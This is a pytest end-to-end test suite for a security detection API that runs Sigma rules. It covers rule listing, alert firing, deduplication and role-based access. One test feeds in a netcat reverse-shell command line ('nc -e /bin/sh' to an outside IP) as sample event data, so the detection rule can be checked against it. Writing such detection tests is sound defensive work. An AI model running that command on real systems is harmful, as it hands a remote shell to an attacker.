"""End-to-end verification for the Phase 3 Sigma detection pipeline.

Exercises:
  - POST /api/v1/detect/run          (Sigma rule firing + alert persist)
  - GET  /api/v1/detect/rules        (rules listed after startup init)
  - POST /api/v1/detect/rules/load   (admin-only reload)
  - RBAC: viewer denied on /run, admin allowed
  - 401 when no auth header

PG persistence is mocked so the test runs offline-safe on a dev box
that does not have asyncpg / a reachable PG. The on-disk
``test_alerts_e2e.py`` covers the real PG path.
"""
from __future__ import annotations

import os
from typing import Any

# Set env BEFORE importing any src.* module.
os.environ.setdefault("NACOS_SERVER", "")
os.environ.setdefault("API_SECRET_KEY", "test-secret-key-12345678")
os.environ.setdefault("STORE_BACKEND", "memory")
os.environ.setdefault("PG_HOST", "192.168.80.101")
os.environ.setdefault("ES_HOSTS", "http://192.168.80.101:9200")
os.environ.setdefault("REDIS_HOST", "192.168.80.101")
os.environ.setdefault("LOG_LEVEL", "WARNING")

import pytest


# ---------- in-memory AlertStore stub ----------------------------------------

class _StubAlertStore:
    """Drop-in replacement for AlertStore that records save_alert calls."""

    def __init__(self) -> None:
        self.saved: list[Any] = []
        self._ensured = False

    async def ensure_indices(self) -> None:
        self._ensured = True

    async def save_alert(self, alert: Any) -> None:
        self.saved.append(alert)

    async def get_alert(self, alert_id: str):
        for a in self.saved:
            if a.alert_id == alert_id:
                return {
                    "alert_id": a.alert_id,
                    "source": str(a.source),
                    "severity": str(a.severity),
                    "title": a.title,
                    "rule_id": a.rule_id,
                }
        return None

    async def list_alerts(self, **_kwargs):
        return []

    async def update_alert_status(self, _alert_id: str, _status: str) -> bool:
        return True


# ---------- fixtures ----------------------------------------------------------

@pytest.fixture(scope="module")
def client():
    from fastapi.testclient import TestClient
    from src.api.main import app

    # Patch the alert_store singleton BEFORE TestClient sends any request
    # so /detect/run (which goes through detector.run_rules -> save_alert)
    # never touches PG.
    from src.agents import alert_store as _as_mod

    stub = _StubAlertStore()
    _as_mod._alert_store = stub
    try:
        from src.detection import detector as _det_mod
        _det_mod._detector = None  # force fresh registry on first call

        with TestClient(app) as c:
            yield c
    finally:
        _as_mod._alert_store = None


@pytest.fixture(scope="module")
def admin_headers(client):
    r = client.post(
        "/api/v1/auth/login", json={"username": "admin", "password": "admin123"}
    )
    assert r.status_code == 200, f"admin login failed: {r.text}"
    return {"Authorization": "Bearer " + r.json()["access_token"]}


@pytest.fixture(scope="module")
def viewer_headers(client):
    r = client.post(
        "/api/v1/auth/login", json={"username": "viewer", "password": "viewer123"}
    )
    assert r.status_code == 200, f"viewer login failed: {r.text}"
    return {"Authorization": "Bearer " + r.json()["access_token"]}


# ---------- tests -------------------------------------------------------------

def test_01_list_rules_after_login(client, admin_headers):
    """GET /detect/rules should expose the bundled Sigma rules."""
    r = client.get("/api/v1/detect/rules", headers=admin_headers)
    assert r.status_code == 200, r.text
    rules = r.json()
    ids = {r["rule_id"] for r in rules}
    assert "ssh-brute-force-2026" in ids
    assert "reverse-shell-netcat-2026" in ids
    assert "priv-esc-su-2026" in ids
    levels = {r["level"] for r in rules}
    assert "high" in levels and "critical" in levels


def test_02_run_ssh_brute_force(client, admin_headers):
    """An ssh-failed event should trigger the ssh-brute-force rule."""
    event = {
        "logsource": {"product": "linux", "service": "sshd"},
        "RuleName": "sshd",
        "Status": "Failed password for invalid user root from 198.51.100.42",
        "ip": "198.51.100.42",
        "hostname": "edge-01",
        "agent": {"id": "ag-1", "ip": "10.0.0.10", "name": "edge-01"},
        "timestamp": "2026-07-28T10:00:00Z",
    }
    r = client.post(
        "/api/v1/detect/run",
        json={"event": event, "event_id": "e2e-ssh-1"},
        headers=admin_headers,
    )
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["event_id"] == "e2e-ssh-1"
    assert "ssh-brute-force-2026" in body["rule_ids"]
    assert body["matched"] >= 1
    assert body["alert_ids"], "alert_ids should be non-empty for a matching rule"
    # First alert_id should start with the sigma: prefix (builder convention)
    assert body["alert_ids"][0].startswith("sigma:")


def test_03_run_revshell(client, admin_headers):
    """An nc -e command line should trigger the reverse-shell rule."""
    event = {
        "logsource": {"product": "linux", "category": "process_creation"},
        "process": {"name": "nc", "cmdline": "nc -e /bin/sh 203.0.113.7 4444", "pid": 9999},
        "hostname": "db-02",
        "user": {"name": "www-data"},
        "timestamp": "2026-07-28T11:00:00Z",
    }
    r = client.post(
        "/api/v1/detect/run",
        json={"event": event, "event_id": "e2e-rev-1"},
        headers=admin_headers,
    )
    assert r.status_code == 200, r.text
    body = r.json()
    assert "reverse-shell-netcat-2026" in body["rule_ids"]


def test_04_run_no_match(client, admin_headers):
    """An unrelated event should produce matched=0 and an empty alert_ids list."""
    event = {
        "logsource": {"product": "linux", "service": "sshd"},
        "RuleName": "kernel",
        "Status": "running",
        "ip": "1.2.3.4",
        "hostname": "host",
        "agent": {"id": "ag-2", "ip": "10.0.0.11", "name": "host"},
    }
    r = client.post(
        "/api/v1/detect/run",
        json={"event": event, "event_id": "e2e-nomatch-1"},
        headers=admin_headers,
    )
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["matched"] == 0
    assert body["alert_ids"] == []
    assert body["rule_ids"] == []


def test_05_idempotency_same_event_id(client, admin_headers):
    """Re-running the same event_id should produce the same alert_id (deduped)."""
    event = {
        "logsource": {"product": "linux", "service": "sshd"},
        "RuleName": "sshd",
        "Status": "Failed password from 198.51.100.99",
        "ip": "198.51.100.99",
        "hostname": "edge-02",
        "agent": {"id": "ag-3", "ip": "10.0.0.12", "name": "edge-02"},
    }
    r1 = client.post(
        "/api/v1/detect/run",
        json={"event": event, "event_id": "e2e-idem-1"},
        headers=admin_headers,
    )
    r2 = client.post(
        "/api/v1/detect/run",
        json={"event": event, "event_id": "e2e-idem-1"},
        headers=admin_headers,
    )
    assert r1.status_code == r2.status_code == 200
    assert r1.json()["alert_ids"] == r2.json()["alert_ids"]


def test_06_rbac_viewer_cannot_run(client, viewer_headers):
    """Viewer role is not allowed to invoke /detect/run (admin/analyst only)."""
    r = client.post(
        "/api/v1/detect/run",
        json={"event": {"x": 1}},
        headers=viewer_headers,
    )
    assert r.status_code in (401, 403), r.text


def test_07_rbac_viewer_can_list_rules(client, viewer_headers):
    """Viewer is allowed to list rules (read-only path)."""
    r = client.get("/api/v1/detect/rules", headers=viewer_headers)
    assert r.status_code == 200, r.text
    assert isinstance(r.json(), list)


def test_08_reload_rules_admin_only(client, admin_headers, viewer_headers):
    """POST /detect/rules/load requires admin role."""
    r1 = client.post("/api/v1/detect/rules/load", headers=admin_headers)
    assert r1.status_code == 200, r1.text
    body = r1.json()
    assert body["loaded"] == 3

    r2 = client.post("/api/v1/detect/rules/load", headers=viewer_headers)
    assert r2.status_code in (401, 403), r2.text


def test_09_unauthenticated_rejected(client):
    """No auth header -> 401."""
    r = client.get("/api/v1/detect/rules")
    assert r.status_code in (401, 403), r.text
